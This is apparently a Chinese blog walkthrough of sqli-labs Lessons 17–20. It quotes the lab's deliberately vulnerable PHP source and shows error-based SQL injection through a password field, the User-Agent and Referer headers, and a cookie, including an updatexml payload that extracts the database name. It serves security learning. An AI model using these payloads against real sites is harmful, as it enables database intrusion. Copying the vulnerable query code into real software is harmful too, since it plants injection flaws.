+<h2 id="源码-8"><a href="#源码-8" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username\</span></span><br><span class="line"><span class="string">=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure>
+<h1 id="Lesson-17"><a href="#Lesson-17" class="headerlink" title="Lesson 17"></a>Lesson 17</h1><p><strong>POST - Update Query- Error Based - String (基于错误的更新查询POST注入)</strong><br>打开题目，发现是密码重置的界面<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221745186.png"><br>尝试重置一下admin的密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=123</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221803416.png"><br>成功重置了admin的密码<br>看一下源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		<span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		<span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">		&#125; </span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//making sure uname is not injectable</span></span><br><span class="line"><span class="variable">$uname</span>=<span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);  </span><br><span class="line"></span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;User Name:&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;New Password:&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username= <span class="subst">$uname</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  		<span class="comment">//echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;;	</span></span><br><span class="line">		<span class="variable">$row1</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];  	</span><br><span class="line">		<span class="comment">//echo &#x27;Your Login name:&#x27;. $row1;</span></span><br><span class="line">		<span class="variable">$update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;<span class="subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="subst">$row1</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$update</span>);</span><br><span class="line">  		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>发现使用check_input函数对uname做了过滤：首先做了截断，将字符限制在15个以内，然后先判断php<code>magic_quotes_gpc</code>环境变量是否打开，取出转义的<code>\</code>，最后，如果uname不是数字，则将其字符进行转义，是数字将其转为数字类型。</p>
+<ul>
+<li><code>mysql_real_escape_string()</code>函数：<code>get_magic_quotes_gpc()</code>函数取得PHP环境配置的变量<code>magic_quotes_gpc(GPC, Get/Post/Cookie)</code>值。返回<code>0</code>表示本功能关闭，返回<code>1</code>表示本功能打开。当<code>magic_quotes_gpc</code>打开时，所有的<code>&#39;(单引号)</code>、<code>&quot;(双引号)</code>、<code>\(反斜杠)</code>和<code>NULL(空字符)</code>会自动转为含有反斜杠的溢出字符。（参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/62d394c38230">https://www.jianshu.com/p/62d394c38230</a>  ）</li>
+<li><code>addslashes()</code>与<code>stripslashes()</code>函数：<code>addslashes(string)</code>函数返回在预定义字符之前添加<strong>反斜杠</strong><code>\</code>的字符串，<code>stripslashes(string)</code>函数删除由<code>addslashes()</code>函数添加的反斜杠。<br>可见，想用uname进行注入十分困难，但passwd参数就比较容易，因为在源码的倒数第三行passwd参数被用来更新密码，这里的passwd没有经过任何过滤，构造payload：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+这里用的还是基于<code>xmlupdate()</code>函数的报错注入，可以看到直接返回了数据库名：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210222048980.png"><br>其余的部分与Lesson 5类似，不再赘述<h1 id="Lesson-18"><a href="#Lesson-18" class="headerlink" title="Lesson 18"></a>Lesson 18</h1></li>
+</ul>
+<p><strong>POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)</strong><br>随便输入看下回显，发现直接显示了我的ip地址和User-Agent头信息：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231246292.png"><br>再结合题目标题，应该是HTTP头注入，这里直接获取了我请求包中的信息显示了出来，看下源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		<span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		<span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="variable">$uagent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">	<span class="variable">$IP</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;Your IP ADDRESS is: &#x27;</span> .<span class="variable">$IP</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	<span class="comment">//echo &#x27;Your User Agent is: &#x27; .$uagent;</span></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">	&#123;</span><br><span class="line">	<span class="variable">$uname</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">	<span class="variable">$passwd</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	echo &#x27;Your Your User name:&#x27;. $uname;</span></span><br><span class="line"><span class="comment">	echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">	echo &#x27;Your Password:&#x27;. $passwd;</span></span><br><span class="line"><span class="comment">	echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">	echo &#x27;Your User Agent String:&#x27;. $uagent;</span></span><br><span class="line"><span class="comment">	echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">	echo &#x27;Your User Agent String:&#x27;. $IP;</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//logging the connection parameters to a file for analysis.	</span></span><br><span class="line">	<span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;User Agent:&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE\</span></span><br><span class="line"><span class="string">	 users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY \</span></span><br><span class="line"><span class="string">	 users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line">	<span class="variable">$result1</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="variable">$row1</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result1</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$row1</span>)</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">			<span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`,\</span></span><br><span class="line"><span class="string">			 `ip_address`, `username`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br><span class="line">			<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$insert</span>);</span><br><span class="line">			<span class="comment">//echo &#x27;Your IP ADDRESS is: &#x27; .$IP;</span></span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">			<span class="comment">//echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;			</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;Your User Agent is: &#x27;</span> .<span class="variable">$uagent</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">			<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());			</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">			</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">			<span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line">			<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;			</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;	</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到这里对输入的uname和passwd参数用<code>check_input()</code>做了严格的过滤，不太能注入，然而它直接将Http头中的user agent不加过滤的作为<code>INSERT INTO</code>语句的值，这就为我们注入提供了可能：我们可以burp抓包送到repeater模块，修改请求头的<code>User-Agent</code>字段，如下：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231248879.png"><br>构造上图中的包，可以看到回显如下：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231247390.png"><br>这里依旧用Lesson 5中提到的<code>xmlupdate</code>报错注入，构造如下的<code>User-Agent</code>头：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231250979.png"><br>可以在回显中看到xmlupdate的报错：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231251132.png"><br>剩下的就和Lesson 5相同了，不再赘述</p>
+<h1 id="Lesson-19"><a href="#Lesson-19" class="headerlink" title="Lesson 19"></a>Lesson 19</h1><p>打开实例，输入账号密码看一下回显：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231548234.png"><br>发现返回了HTTP头中referer字段的值，关于referer字段的作用，我在下面记录一下：<br>referer字段用来提供访问来源的信息，当用户在地址栏输入网址或从标签页打开网址时，就不会发送referer字段，而在下面三种场景中会发送：</p>
+<ul>
+<li>用户单击网页链接</li>
+<li>用户发送表单</li>
+<li>网页加载静态资源，如图片、脚本、样式<br>在这三种场景下，浏览器会将当前网址作为referer字段放在请求头里并发送。<br>回到题目，首先burp抓包送到repeater：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231939060.png"><br>可以看到这里的referer字段就是Lesson19网页的URL，尝试修改一下：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231940816.png"><br>报错：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231941038.png"><br>根据报错构造如下payload，依旧使用基于<code>xmlupdate()</code>的报错注入：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231943433.png"><br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231943010.png"><br>其余同Lesson 18，不再赘述<h1 id="Lesson-20"><a href="#Lesson-20" class="headerlink" title="Lesson 20"></a>Lesson 20</h1></li>
+</ul>
+<p><strong>POST - Cookie injections - Uagent field - Error based (基于错误的cookie头部POST注入)</strong><br>登录后显示如下界面：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231946122.png"><br>实际上这里显示的逻辑是：登录成功后前端又带着cookie使用基于GET方法请求了index页面，这一点从抓到的包可以看出来：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231954343.png"><br>这里是提交后POST包和它的响应包，可以看到这里的状态码是302，直接将页面重定向到了index.php，实际上这个返回页面看起来是这样的：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231956575.png"><br>只是快速重定向到了index.php，重定向发送了一个GET包，内容如下：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231957263.png"><br>可以看到其中包含了cookie信息，尝试注入：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231958296.png"><br>爆出错误信息：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231958821.png"><br>构造payload：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210232001476.png"><br>爆出数据库名<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210232001738.png"><br>剩下的就和Lesson 5一样了，不再赘述</p>
+<h2 id="源码-9"><a href="#源码-9" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">			<span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">			<span class="keyword">if</span> (!<span class="variable">$result</span>)</span><br><span class="line">  				&#123;</span><br><span class="line">  				<span class="keyword">die</span>(<span class="string">&#x27;Issue with your mysql: &#x27;</span> . <span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">  				&#125;</span><br><span class="line">			<span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure>
+    </article>
+    <!-- license -->
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:mark765111@aliyun.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="https://github.com/MarkIlV" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://www.zhihu.com/people/bing-huo-7651" class="iconfont-archer zhihu" target="_blank" title=zhihu></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://space.bilibili.com/290770601" class="iconfont-archer bilibili" target="_blank" title=bilibili></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-1"><span class="toc-number">1.</span> <span class="toc-text">Lesson 1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%901%E3%80%91%E6%9F%A5%E5%88%97%E6%95%B0"><span class="toc-number">1.1.</span> <span class="toc-text">【1】查列数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%902%E3%80%91%E6%9F%A5%E5%BA%93%E5%90%8D"><span class="toc-number">1.2.</span> <span class="toc-text">【2】查库名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%903%E3%80%91%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E8%A1%A8"><span class="toc-number">1.3.</span> <span class="toc-text">【3】获取所有表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%904%E3%80%91%E6%9F%A5%E8%AF%A2%E5%AD%97%E6%AE%B5"><span class="toc-number">1.4.</span> <span class="toc-text">【4】查询字段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%905%E3%80%91%E6%9F%A5%E8%AF%A2%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81"><span class="toc-number">1.5.</span> <span class="toc-text">【5】查询用户名和密码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-2"><span class="toc-number">2.</span> <span class="toc-text">Lesson 2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%901%E3%80%91%E6%9F%A5%E5%88%97%E6%95%B0-1"><span class="toc-number">2.1.</span> <span class="toc-text">【1】查列数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%902%E3%80%91%E6%9F%A5%E5%BA%93%E5%90%8D-1"><span class="toc-number">2.2.</span> <span class="toc-text">【2】查库名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 